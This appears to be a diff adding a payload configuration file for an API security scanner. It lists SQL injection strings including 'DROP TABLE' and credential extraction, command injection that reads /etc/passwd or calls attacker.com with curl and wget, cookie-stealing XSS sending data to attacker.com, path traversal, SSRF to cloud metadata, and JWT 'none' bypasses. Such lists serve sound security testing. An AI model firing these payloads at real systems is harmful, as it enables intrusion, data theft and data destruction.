@@ -1,0 +1,185 @@
+# API Security Checker - Payloads Configuration
+# Custom payloads for security testing
+
+sql_injection:
+  error_based:
+    - "'"
+    - "''"
+    - "' OR '1'='1"
+    - "' OR '1'='1'--"
+    - "' OR '1'='1'/*"
+    - "1' ORDER BY 1--"
+    - "1' ORDER BY 10--"
+    - "' UNION SELECT NULL--"
+    - "'; DROP TABLE users--"
+  union_based:
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT NULL,NULL--"
+    - "' UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT 1,2,3--"
+    - "' UNION SELECT username,password FROM users--"
+  time_based:
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "' AND SLEEP(5)--"
+    - "'; SELECT pg_sleep(5)--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+  boolean_based:
+    - "' AND '1'='1"
+    - "' AND '1'='2"
+    - "' OR 1=1--"
+    - "' OR 1=2--"
+
+command_injection:
+  basic:
+    - "; id"
+    - "| id"
+    - "& id"
+    - "&& id"
+    - "|| id"
+    - "$(id)"
+    - "`id`"
+  file_read:
+    - "; cat /etc/passwd"
+    - "| cat /etc/passwd"
+    - "& type C:\\Windows\\win.ini"
+    - "$(cat /etc/passwd)"
+  blind:
+    - "; sleep 5"
+    - "| sleep 5"
+    - "& ping -c 5 127.0.0.1"
+    - "&& sleep 5"
+  network:
+    - "; curl http://attacker.com"
+    - "| wget http://attacker.com"
+    - "$(curl http://attacker.com)"
+
+xss:
+  reflected:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "javascript:alert('XSS')"
+    - "'-alert('XSS')-'"
+  stored:
+    - "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"
+    - "<img src=x onerror=fetch('http://attacker.com?c='+document.cookie)>"
+
+path_traversal:
+  unix:
+    - "../../../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "..%2f..%2f..%2fetc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+  windows:
+    - "..\\..\\..\\windows\\win.ini"
+    - "....\\\\....\\\\....\\\\windows\\win.ini"
+
+ssrf:
+  internal:
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://0.0.0.0"
+    - "http://[::1]"
+    - "http://169.254.169.254"  # AWS metadata
+  bypass:
+    - "http://127.0.0.1.nip.io"
+    - "http://localtest.me"
+    - "http://0x7f000001"
+    - "http://2130706433"  # Decimal for 127.0.0.1
+
+graphql:
+  introspection:
+    - "__schema { types { name } }"
+    - "__schema { queryType { name fields { name } } }"
+    - "__schema { mutationType { name fields { name } } }"
+    - "__type(name: \"User\") { name fields { name type { name } } }"
+  depth_test_levels: [5, 10, 20, 50, 100]
+  batch_sizes: [5, 10, 50, 100]
+
+authentication:
+  weak_passwords:
+    - "password"
+    - "123456"
+    - "admin"
+    - "password123"
+    - "letmein"
+    - "welcome"
+    - "monkey"
+    - "dragon"
+  jwt_none_algorithms:
+    - "none"
+    - "None"
+    - "NONE"
+    - "nOnE"
+
+headers:
+  security_required:
+    - "Strict-Transport-Security"
+    - "X-Content-Type-Options"
+    - "X-Frame-Options"
+    - "Content-Security-Policy"
+    - "X-XSS-Protection"
+    - "Referrer-Policy"
+    - "Permissions-Policy"
+  sensitive_exposed:
+    - "Server"
+    - "X-Powered-By"
+    - "X-AspNet-Version"
+    - "X-AspNetMvc-Version"
+
+files:
+  sensitive:
+    - ".git/HEAD"
+    - ".git/config"
+    - ".env"
+    - ".env.local"
+    - ".env.production"
+    - "config.php"
+    - "wp-config.php"
+    - "web.config"
+    - "application.yml"
+    - "application.properties"
+    - ".htaccess"
+    - "composer.json"
+    - "package.json"
+    - "Gemfile"
+    - "requirements.txt"
+  backups:
+    - "backup.sql"
+    - "database.sql"
+    - "dump.sql"
+    - "db.sql"
+    - "backup.zip"
+    - "backup.tar.gz"
+    - "site.bak"
+
+endpoints:
+  admin:
+    - "/admin"
+    - "/admin/"
+    - "/administrator"
+    - "/wp-admin"
+    - "/cpanel"
+    - "/phpmyadmin"
+    - "/adminer"
+  api:
+    - "/api"
+    - "/api/v1"
+    - "/api/v2"
+    - "/graphql"
+    - "/graphiql"
+    - "/swagger"
+    - "/swagger-ui"
+    - "/api-docs"
+    - "/openapi.json"
+    - "/swagger.json"
+  debug:
+    - "/debug"
+    - "/trace"
+    - "/actuator"
+    - "/actuator/health"
+    - "/actuator/env"
+    - "/metrics"
+    - "/status"
+    - "/health"
+    - "/.well-known/health"
